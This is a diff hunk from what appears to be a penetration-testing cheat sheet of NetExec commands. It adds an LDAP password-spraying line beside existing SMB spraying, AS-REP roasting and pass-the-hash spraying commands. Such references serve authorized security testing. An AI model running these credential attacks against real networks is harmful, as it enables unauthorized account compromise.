@@ -111,6 +111,7 @@ nxc ldap 10.10.10.10 -u user -p password --asreproast output.txt
 nxc smb 10.10.10.0/24 -u users.txt -p 'Password123'
 nxc smb targets.txt -u users.txt -p passwords.txt
 nxc smb targets.txt -u users.txt -p passwords.txt --continue-on-success
+nxc ldap targets.txt -u users.txt -p passwords.txt --continue-on-success
 
 # Spray with Hash
 nxc smb 10.10.10.0/24 -u administrator -H NTHASH
